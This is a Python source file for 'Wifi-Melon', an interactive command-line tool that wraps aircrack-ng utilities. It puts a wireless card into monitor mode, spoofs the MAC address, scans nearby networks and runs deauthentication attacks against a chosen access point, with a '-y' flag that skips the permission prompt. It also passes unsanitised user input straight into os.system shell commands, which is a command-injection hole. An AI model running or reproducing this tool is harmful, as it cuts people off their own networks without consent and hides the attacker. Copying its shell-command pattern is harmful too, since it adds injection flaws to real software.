import sys
import os

def index_in_list(a_list, index):
	return index < len(a_list)

def is_root():
    return os.geteuid() == 0

def main():
	def checkArray(TBL, Wanted):
		for i in TBL:
			if i == Wanted:
				return True
		return False

	cmds = [
		"mon",
		"nData",
		"Deauth",
		"clear",
		"help",
		"mAddrC",
		"cCard",
		"Banner",
		"WifiDiscover"
	]
	if not index_in_list(sys.argv, 1):
		print("No network card!")
		sys.exit()

	Card = sys.argv[1]

	Icon = """
	 _     _  ___   _______  ___          __   __  _______  ___      _______  __    _ 
	| | _ | ||   | |       ||   |        |  |_|  ||       ||   |    |       ||  |  | |
	| || || ||   | |    ___||   |  ____  |       ||    ___||   |    |   _   ||   |_| |
	|       ||   | |   |___ |   | |____| |       ||   |___ |   |    |  | |  ||       |
	|       ||   | |    ___||   |        |       ||    ___||   |___ |  |_|  ||  _    |
	|   _   ||   | |   |    |   |        | ||_|| ||   |___ |       ||       || | |   |
	|__| |__||___| |___|    |___|        |_|   |_||_______||_______||_______||_|  |__| By Kuri#1686
	"""

	print("\033[92m" + Icon + "\033[0m")

	def printBanner():
		print("\033[92m" + Icon + "\033[0m")


	while True:
		opt = input("Wifi-Melon>")
		if opt == cmds[0] + " 1":
			os.system("ifconfig " + Card + " down")
			os.system("iwconfig " + Card + " mode monitor")
			os.system("ifconfig " + Card + " up")
			print(Card + " has been set to monitor mode!")
		elif opt == cmds[0] + " 0":
			os.system("ifconfig " + Card + " down")
			os.system("iwconfig " + Card + " mode managed")
			os.system("ifconfig " + Card + " up")
			print(Card + " has been set to managed mode!")
		elif opt == cmds[1]:
			os.system("ifconfig")
		elif opt == cmds[2] or opt == cmds[2] + " -y":
			bssid = input("Wifi-Melon/Deauth/Bssid>")
			channel = input("Wifi-Melon/Deauth/Chanell>")
			pkts = input("Wifi-Melon/Deauth/PKTS>")
			sure = ""
			if not opt == cmds[2] + " -y":
				sure = input("Are you sure? This is illegal to do without premission(y/n)")
			if sure == "y" or sure == "Y" or opt == cmds[2] + " -y":
				print("Deauthing...")
				os.system("ifconfig " + Card + " down")
				os.system("iwconfig " + Card + " channel " + channel)
				os.system("ifconfig " + Card + " up")
				os.system("aireplay-ng --deauth " + pkts + " -a " + bssid + " " + Card)
		elif opt == cmds[3]:
			os.system("clear")
		elif opt == cmds[4]:
			print("help -> Display this message")
			print("mon {0-1} -> change network card mode. 0 = managed 1 = monitor")
			print("nData -> ifconfig")
			print("Deauth -> Deauthenticate a networks connection. arguments: -y")
			print("WifiDiscover -> Discover wifi's and ther info such as bssid, channel using airodump-ng")
			print("clear -> clear screen")
			print("mAddrC {ADDR} -> Change mac addres")
			print("cCard {Card} -> Change Network Card")
			print("Banner -> Display the Wifi-Melon banner")
		elif cmds[5] in opt:
			if index_in_list(opt.split("mAddrC "), 1):
				os.system("ifconfig " + Card + " down")
				os.system("iwconfig " + Card + " hw ether " + opt.split("mAddrC ")[1])
				os.system("ifconfig " + Card + " up")
				print("Changed mac addres to: " + opt.split("mAddrC ")[1])
			else:
				print("No mac address entered")
		elif cmds[6] in opt:
			if index_in_list(opt.split("cCard "), 1):
				Card = opt.split("cCard ")[1]
				print(Card + " Has been set as network card!")
		elif opt == cmds[7]:
			printBanner()
		elif opt == cmds[8]:
			os.system("airodump-ng " + Card)
		elif not opt == "":
			print("Command is not recognized!")

if __name__ == "__main__":
	if index_in_list(sys.argv, 2):
		if sys.argv[2] == "-y":
			os.system('clear')
			main()
	else:
		print("\033[93mBy usin Wifi-Melon you agree to the following: The developers do not assume any liabilities or misuse caused by Wifi-Melon. For educational use only!(y/n)\033[0m")
		if is_root() == False:
			print("\n!!!Please note that you are not running Wifi-Melon as root. This may affect some features!!!\n")
		x = input(">")
		if x == "y" or x == "Y":
			os.system('clear')
			main()
		else:
			print("Please accept to use Wifi-Melon")
